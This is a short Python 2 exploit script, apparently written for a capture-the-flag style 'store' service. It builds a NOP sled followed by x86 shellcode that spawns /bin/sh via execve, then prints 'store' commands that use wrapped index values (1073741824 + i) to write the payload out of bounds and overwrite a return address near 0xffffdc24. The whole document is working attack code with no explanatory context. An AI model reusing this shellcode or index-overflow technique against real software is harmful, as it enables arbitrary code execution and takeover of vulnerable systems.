shellcode = [0x90909090] * 69

shellcode += [
    0x6850c031,
    0x68732f2f,
    0x69622f68,
    0xb0e3896e,
    0x31c9310b,
    0x0080cdd2,
]

for i, j in enumerate(shellcode):
	print 'store'
	print j
	if i % 3:
		print i
	else :
		print 1073741824 + i

print 'store'
print 0xffffdc24 + 200
print 1073741824 + 114
print "quit"
